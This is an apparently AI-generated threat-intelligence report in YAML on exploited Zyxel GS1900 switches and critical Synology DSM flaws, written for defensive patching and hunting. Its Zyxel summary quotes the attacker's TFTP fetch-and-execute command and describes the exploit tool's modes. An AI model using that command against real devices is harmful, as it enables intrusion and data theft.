@@ -1,0 +1,189 @@
+domain: S1
+run_id: 2026-09-22T0410Z-intel
+model: Sonnet 5
+model_id: claude-sonnet-5
+started_at: 2026-09-22T04:12:58Z
+ended_at: 2026-09-22T04:25:08Z
+duration_seconds: 730
+self_telemetry:
+  webfetch_calls: 0
+  websearch_calls: 2
+  bridge_fetches: 22
+items:
+  - title: "CVE-2026-7273 — Zyxel GS1900 switches: pre-auth stack overflow in the CGI login handler added to CISA KEV after GreyNoise catches a suspected China-nexus actor exfiltrating configs and hashed root credentials from 996 devices in 48 countries"
+    sources:
+      - { url: "https://www.zyxel.com/global/en/support/security-advisories/zyxel-security-advisory-for-stack-based-buffer-overflow-vulnerability-in-gs1900-series-switches-06-16-2026", publisher: "Zyxel PSIRT", date: "2026-06-16", role: "primary" }
+      - { url: "https://www.greynoise.io/blog/open-season-on-kapibala-attacker-steals-government-records-wordpress-exploitation", publisher: "GreyNoise", date: "2026-09-21", role: "primary" }
+      - { url: "https://www.cisa.gov/known-exploited-vulnerabilities-catalog", publisher: "CISA KEV", date: "2026-09-21", role: "primary" }
+      - { url: "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2026-7273", publisher: "NVD", date: "2026-09-21", role: "corroborating" }
+      - { url: "https://www.acronis.com/en/tru/posts/red-heron-exploits-gitea-n-day-flaw-in-multinational-campaign-exposing-new-linux-rootkit/", publisher: "Acronis Threat Research Unit", date: "2026-09-13", role: "background" }
+    discovery_trace: "first seen at: kev_window_diff.py mandatory KEV disposition tasking (CVE-2026-7273 flagged as the sole NOT-COVERED KEV addition in the 26h window) → CISA KEV JSON, URL https://www.cisa.gov/known-exploited-vulnerabilities-catalog → primary: Zyxel PSIRT advisory, URL https://www.zyxel.com/global/en/support/security-advisories/zyxel-security-advisory-for-stack-based-buffer-overflow-vulnerability-in-gs1900-series-switches-06-16-2026 → primary: NVD CVE record, URL https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2026-7273 → the KEV notes field named GreyNoise as the exploitation-evidence source → primary: GreyNoise blog, URL https://www.greynoise.io/blog/open-season-on-kapibala-attacker-steals-government-records-wordpress-exploitation → pivot for actor-overlap context: Acronis TRU, URL https://www.acronis.com/en/tru/posts/red-heron-exploits-gitea-n-day-flaw-in-multinational-campaign-exposing-new-linux-rootkit/"
+    summary: |
+      CVE-2026-7273 (CVSS3.1 8.8, AV:A/AC:L/PR:N/UI:N — adjacent-network, no auth) is a stack-based buffer
+      overflow (CWE-121) in the CGI program of Zyxel GS1900 series smart-managed switch firmware, letting a
+      LAN-based unauthenticated attacker execute OS commands via a crafted HTTP request. Zyxel disclosed and
+      patched it on 2026-06-16 across ten GS1900 models (GS1900-8, -8HP, -10HP, -16, -24, -24E, -24EP,
+      -24HPv2, -48, -48HPv2), each fixed at a per-model "…(x).2C0" build one increment above the vulnerable
+      "…(x).1C0 and earlier" baseline. CISA added it to KEV on 2026-09-21 (3-day remediation due-date
+      2026-09-24) on the strength of GreyNoise's own sensor-grid research, published the same day: GreyNoise
+      has tracked a single malicious cyber actor (MCA) — assessed a suspected Chinese speaker, likely
+      operating in UTC+8, based on copious Chinese-language code comments and operational timing — since May
+      2026, and states the actor is "the same or related to" Red Heron, a Chinese-speaking, PRC-linked cluster
+      Acronis TRU profiled on 2026-09-13 (Gitea CVE-2026-60004 n-day exploitation, JITTERLY Linux C2 implant,
+      SIXZUT LD_PRELOAD rootkit), based on shared C2 domain, malware family and other TTPs — a claim GreyNoise
+      itself frames as an assessment, not a confirmed identity match. GreyNoise reverse-engineered a
+      PyArmor-6.7.5-obfuscated Python exploit tool titled "Zyxel GS1900 Pre-Auth RCE" offering two exploitation
+      modes — a deterministic single-request GOT-overwrite mode and an ASLR brute-force stack mode (~2,048
+      average attempts) — with command-line overrides for libc base address, GOT offsets and the target
+      firmware's `system()` offset, meaning the tool is built to be re-targeted across the whole affected
+      firmware range (2.10–2.90 observed against GS1900-24) rather than hard-coded to one build. On or about
+      17 August 2026 the actor used this tool to exploit and exfiltrate configuration data, networking
+      information and hashed root-level credentials from 996 Zyxel GS1900 switches across 48 countries; the
+      post-exploitation command chain used the switch's on-device shell to fetch a TFTP-delivered collector
+      script (`sh -c tftp -gr c -l /1 <redacted-IP> 6969;/bin/sh /1`) and staged the harvested data to
+      `/home/web/tmp/info.txt` for retrieval. Although credentials were hashed, 564 of the 996 victim switches
+      (57%) were still running factory-default credentials, meaning the exfiltrated hash was often
+      unnecessary — the default password alone gave the actor durable re-entry. GreyNoise frames the Zyxel
+      campaign as one prong of a broader, opportunistic multi-CVE operation by the same actor: an
+      already-KEV-listed Ubiquiti UniFi OS RCE chain (CVE-2026-34908/34909/34910) attempted in June 2026, and
+      a WordPress WP2Shell exploit chain (CVE-2026-63030/CVE-2026-60137, already disclosed and covered
+      elsewhere) that from 20 July onward compromised at least 49 organizations in 29 countries, with the
+      single worst case — an unnamed Western government — losing over 18,000 sensitive database records; a
+      full forensic timeline in GreyNoise's report shows the actor's post-exploitation tooling (AMSI-bypass
+      variants, GodPotato-based token theft, an in-process SYSTEM-impersonation PowerShell script) bears
+      hallmarks GreyNoise attributes to LLM-assisted code generation (near-duplicate script iterations with
+      superficial-only changes, heavy inline Chinese-language commentary explaining each attempted technique).
+    region_nexus: "global; 996 victim switches across 48 countries per GreyNoise, no Swiss victim named or excluded; Zyxel GS1900 is a widely-deployed SMB/branch-office smart-managed switch line plausible in Swiss cantonal/communal IT estates"
+    primary_sector_nexus: "indirect — one confirmed government victim (unnamed, non-Swiss) in the same actor's WordPress prong; network-edge infrastructure relevant to any public-sector branch-office deployment"
+    sector: "public-sector"
+    cves: ["CVE-2026-7273"]
+    techniques: ["T1190", "T1105", "T1059.004", "T1005"]
+    affected_products: ["Zyxel GS1900-8", "Zyxel GS1900-8HP", "Zyxel GS1900-10HP", "Zyxel GS1900-16", "Zyxel GS1900-24", "Zyxel GS1900-24E", "Zyxel GS1900-24EP", "Zyxel GS1900-24HPv2", "Zyxel GS1900-48", "Zyxel GS1900-48HPv2"]
+    entity_keys: []
+    new_entities:
+      - { key: "actor:red-heron", type: actor, name: "Red Heron", aliases: [],
+          summary: "Chinese-speaking, PRC-linked (moderate confidence) cluster first profiled by Acronis TRU (2026-09-13) for rapid n-day weaponisation of Gitea CVE-2026-60004 with the JITTERLY Linux implant and embedded SIXZUT LD_PRELOAD rootkit; GreyNoise (2026-09-21) assesses the actor behind the CVE-2026-7273 Zyxel GS1900 exploitation and a parallel WordPress WP2Shell campaign is the same as or related to Red Heron, based on shared C2 domain, malware family and other TTPs." }
+      - { key: "product:zyxel-gs1900-switches", type: product, name: "Zyxel GS1900 Series Switches", aliases: [], summary: "Zyxel smart-managed switch product line (GS1900-8/-8HP/-10HP/-16/-24/-24E/-24EP/-24HPv2/-48/-48HPv2)." }
+    relation_suggestions:
+      - { subject: "actor:red-heron", object: "product:zyxel-gs1900-switches",
+          basis: "GreyNoise: 'The adversary is the same or related to \"Red Heron\" reported on by Acronis based on use of the same command and control (C2) domain, malware family, exploitation of Gitea in July, and other tactics, techniques, and procedures (TTPs)' — GreyNoise assesses this actor exploited CVE-2026-7273 against 996 Zyxel GS1900 switches (GreyNoise, 2026-09-21)." }
+    verification: MULTI-SOURCE
+    confidence: HIGH
+    novelty: new
+    evidence:
+      - quote: "A stack-based buffer overflow vulnerability in the CGI program of the Zyxel GS1900 series switch firmware could allow a LAN-based, unauthenticated attacker to exploit the flaw and potentially execute OS commands via a crafted HTTP request."
+        attribution: "Zyxel PSIRT"
+        source_url: "https://www.zyxel.com/global/en/support/security-advisories/zyxel-security-advisory-for-stack-based-buffer-overflow-vulnerability-in-gs1900-series-switches-06-16-2026"
+      - quote: "The MCA successfully exploited and exfiltrated sensitive data from 996 ZyXEL switches across 48 countries."
+        attribution: "GreyNoise"
+        source_url: "https://www.greynoise.io/blog/open-season-on-kapibala-attacker-steals-government-records-wordpress-exploitation"
+      - quote: "As of 17 September 2026, this is the first publicly documented case of exploitation in the wild of this vulnerability, which is also not on the Cybersecurity and Infrastructure Security Agency (CISA) Known Exploited Vulnerabilities (KEV) catalog at the time of publication."
+        attribution: "GreyNoise"
+        source_url: "https://www.greynoise.io/blog/open-season-on-kapibala-attacker-steals-government-records-wordpress-exploitation"
+      - quote: "While the credentials were hashed, 564 of the victims had factory default credentials."
+        attribution: "GreyNoise"
+        source_url: "https://www.greynoise.io/blog/open-season-on-kapibala-attacker-steals-government-records-wordpress-exploitation"
+      - quote: "The adversary is the same or related to “Red Heron” reported on by Acronis based on use of the same command and control (C2) domain, malware family, exploitation of Gitea in July, and other tactics, techniques, and procedures (TTPs)."
+        attribution: "GreyNoise"
+        source_url: "https://www.greynoise.io/blog/open-season-on-kapibala-attacker-steals-government-records-wordpress-exploitation"
+    extended_notes: |
+      Attack-vector nuance for the composer: CVSS vector is AV:A (adjacent network), i.e. the CGI endpoint is
+      reachable only from a host already on the same L2/LAN segment as the switch's management interface —
+      NOT directly internet-exposed by default. This still clears the bar because (a) confirmed ITW
+      exploitation at scale (996 devices/48 countries) and a fresh CISA KEV listing with a 3-day due date make
+      this squarely PD-11(b) regardless of the network position, and (b) many GS1900 deployments put the web
+      management UI on a flat/trusted VLAN reachable from any already-compromised host, or misconfigure NAT/
+      port-forwarding onto WAN for remote admin — exactly the scenario 564/996 factory-default-credential
+      victims suggest. Detection concept: outbound TFTP GET requests (UDP/69, or non-standard ports as
+      observed here — src used tftp -l on a numeric high port 6969 in the observed chain) originating FROM a
+      network-switch management IP is anomalous and a strong hunt signal; likewise a switch's on-device shell
+      invoking `/bin/sh` against a freshly TFTP-retrieved file. Hardening: patch to the per-model "…(x).2C0"
+      build; segment switch management interfaces onto a dedicated out-of-band management VLAN with ACLs
+      denying general-LAN access to the CGI/web-admin port; rotate any credential that may have shipped as
+      factory-default, and treat any GS1900 that was reachable and unpatched between 2026-06-16 (disclosure)
+      and patch application as a candidate for compromise assessment (config/credential exfiltration leaves
+      no persistent artifact on the switch itself per GreyNoise's write-up — the exposure is retroactive
+      credential/config compromise, not an implant). Background-only source (Acronis, published 2026-09-13,
+      outside this run's 26h window) is cited solely to substantiate the "Red Heron" actor-overlap claim
+      GreyNoise itself makes — it is not itself proposed as an in-window finding.
+
+  - title: "CVE-2026-13684 / CVE-2026-13639 — Synology DSM: two unauthenticated CVSS 9.8 flaws (SCGI output-encoding bug, insufficient login-logic entropy) allow remote arbitrary file read/write and DoS with no credentials"
+    sources:
+      - { url: "https://www.synology.com/en-global/security/advisory/Synology_SA_26_13", publisher: "Synology PSIRT", date: "2026-09-18", role: "primary" }
+      - { url: "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2026-13684", publisher: "NVD", date: "2026-09-18", role: "corroborating" }
+      - { url: "https://www.heise.de/news/Jetzt-aktualisieren-Angreifer-konnten-beliebige-Daten-von-Synology-NAS-auslesen-11458757.html", publisher: "heise online", date: "2026-09-18", role: "corroborating" }
+    discovery_trace: "first seen at: ncsc-ch-security-hub, URL https://security-hub.ncsc.admin.ch/#/posts/12960 (NCSC Switzerland CSH advisory post, created 2026-09-21T11:24:44Z) → cross-confirmed same-day by anssi-fr, URL https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-1209/ → primary: Synology PSIRT advisory, URL https://www.synology.com/en-global/security/advisory/Synology_SA_26_13 → primary: NVD CVE record, URL https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2026-13684 → corroborating: heise online, URL https://www.heise.de/news/Jetzt-aktualisieren-Angreifer-konnten-beliebige-Daten-von-Synology-NAS-auslesen-11458757.html"
+    summary: |
+      Synology disclosed eight CVEs in DiskStation Manager (DSM) on 2026-09-18 (Synology-SA-26:13), two of
+      them unauthenticated and CVSS3.1 9.8 (AV:N/AC:L/PR:N/UI:N, full C/I/A impact): CVE-2026-13684 (CWE-116,
+      improper encoding/escaping of output in the SCGI component) and CVE-2026-13639 (CWE-331, insufficient
+      entropy in the login logic) each let a remote, unauthenticated attacker read or write arbitrary files
+      on the NAS and conduct denial-of-service. Two further flaws need only a low-privileged authenticated
+      session — CVE-2026-13673 (CVSS 8.8, CWE-732 incorrect permission assignment in the LDAP API) and
+      CVE-2026-6205 (CVSS 8.1, CWE-73 external control of file name/path in the Upload API), both also
+      yielding arbitrary file read/write plus DoS. All four are fixed in DSM 7.4-90075, 7.3.2-86009-4,
+      7.2.2-72806-9 and 7.2.1-69057-12; Synology lists no mitigation for the unauthenticated pair. NVD's SSVC
+      assessment records exploitation status as "none" as of 2026-09-18, and NCSC Switzerland's advisory
+      (published into its Cyber Security Hub on 2026-09-21, three days after Synology's original release)
+      likewise records current exploitation status as unknown/unconfirmed — this is a newly-disclosed, not-yet
+      -exploited pair of pre-auth critical flaws, surfaced to this pipeline via the national-CERT relay. heise
+      online's coverage (also 2026-09-18) explicitly flags the risk profile: the vendor's own advisory
+      language implies trivial exploitability, which the outlet expects to draw ransomware operators quickly.
+      Synology NAS devices are commonly placed with remote/WAN-facing access enabled for off-site backup and
+      file-sync use cases, making the unauthenticated pair's true internet-exposure a function of each
+      deployment's own QuickConnect/port-forwarding configuration rather than a DSM default.
+    region_nexus: "global; DSM is a widely deployed SMB/branch-office/home-office NAS platform plausible across Swiss cantonal and communal IT estates and their suppliers"
+    primary_sector_nexus: "indirect — general-purpose network-attached storage infrastructure, not sector-specific"
+    sector: "public-sector"
+    cves: ["CVE-2026-13684", "CVE-2026-13639", "CVE-2026-13673", "CVE-2026-6205"]
+    techniques: ["T1190", "T1005"]
+    affected_products: ["Synology DiskStation Manager (DSM) 7.4", "Synology DiskStation Manager (DSM) 7.3.2", "Synology DiskStation Manager (DSM) 7.2.2", "Synology DiskStation Manager (DSM) 7.2.1"]
+    entity_keys: []
+    new_entities:
+      - { key: "product:synology-dsm", type: product, name: "Synology DiskStation Manager (DSM)", aliases: ["DSM"], summary: "Synology's NAS operating system, the management/service layer for its DiskStation product line." }
+    relation_suggestions: []
+    verification: MULTI-SOURCE
+    confidence: HIGH
+    novelty: new
+    evidence:
+      - quote: "An improper encoding or escaping of output vulnerability in SCGI in Synology DiskStation Manager (DSM) before 7.2.1-69057-12, 7.2.2-72806-9, 7.3.2-86009-4 and 7.4-90075 allows remote attackers to read or write arbitrary files and conduct denial-of-service attacks."
+        attribution: "Synology PSIRT / NVD"
+        source_url: "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2026-13684"
+      - quote: "Successful exploitation allows unauthenticated attackers to read and write arbitrary files, or disrupt NAS services via denial-of-service attacks."
+        attribution: "NCSC Switzerland (Cyber Security Hub)"
+        source_url: "https://security-hub.ncsc.admin.ch/#/posts/12960"
+      - quote: "Die knappe Beschreibung der Lücken auf der Synology-Hinweisseite dürfte Ransomware-Autoren und andere Kriminelle zügig auf den Plan rufen, denn ihre Ausnutzung ist nach Synologys Angaben sehr einfach."
+        attribution: "heise online (Dr. Christopher Kunz)"
+        source_url: "https://www.heise.de/news/Jetzt-aktualisieren-Angreifer-konnten-beliebige-Daten-von-Synology-NAS-auslesen-11458757.html"
+    extended_notes: |
+      German-language evidence quote translates as: "The terse description of the flaws on Synology's advisory
+      page is likely to quickly draw ransomware authors and other criminals, since exploitation is, according
+      to Synology, very easy." heise separately notes several readers pointed out the 2026-09-18 advisory
+      targets older DSM baselines — DSM 7.4.1-90080 has been current since July 2026 — so an estate already on
+      the latest supported build may already be unaffected; confirm the running build against the advisory's
+      "Affected Products" table rather than assuming currency from a recent-looking version string. No public
+      PoC or scanning activity reported yet for either critical CVE as of source dates (2026-09-18); given the
+      SCGI/login-logic surface is likely reachable pre-auth on any DSM instance with the standard web/DSM
+      management port open, recommend treating this as urgent-patch (not wait-for-next-maintenance-window),
+      consistent with heise's own framing.
+
+cve_table:
+  - { cve: "CVE-2026-7273", product: "Zyxel GS1900 Series Switches", cvss: 8.8, epss: 0.32, kev: true, exploited: true, patch: "per-model …(x).2C0 build (see Zyxel advisory table)", source: "https://www.zyxel.com/global/en/support/security-advisories/zyxel-security-advisory-for-stack-based-buffer-overflow-vulnerability-in-gs1900-series-switches-06-16-2026" }
+  - { cve: "CVE-2026-13684", product: "Synology DSM", cvss: 9.8, epss: null, kev: false, exploited: false, patch: "7.4-90075 / 7.3.2-86009-4 / 7.2.2-72806-9 / 7.2.1-69057-12", source: "https://www.synology.com/en-global/security/advisory/Synology_SA_26_13" }
+  - { cve: "CVE-2026-13639", product: "Synology DSM", cvss: 9.8, epss: null, kev: false, exploited: false, patch: "7.4-90075 / 7.3.2-86009-4 / 7.2.2-72806-9 / 7.2.1-69057-12", source: "https://www.synology.com/en-global/security/advisory/Synology_SA_26_13" }
+  - { cve: "CVE-2026-13673", product: "Synology DSM", cvss: 8.8, epss: null, kev: false, exploited: false, patch: "7.4-90075 / 7.3.2-86009-4 / 7.2.2-72806-9 / 7.2.1-69057-12", source: "https://www.synology.com/en-global/security/advisory/Synology_SA_26_13" }
+  - { cve: "CVE-2026-6205", product: "Synology DSM", cvss: 8.1, epss: null, kev: false, exploited: false, patch: "7.4-90075 / 7.3.2-86009-4 / 7.2.2-72806-9 / 7.2.1-69057-12", source: "https://www.synology.com/en-global/security/advisory/Synology_SA_26_13" }
+
+watchlist_sweep:
+  duty: products
+  products_checked: 0
+  suppliers_checked: 0
+  hits: 0
+  note: "no product watchlist configured for this deployment (none in config/org-profile.yaml) — documented no-op per spawn tasking"
+
+candidate_sources:
+  []
+
+coverage_gaps:
+  []
+
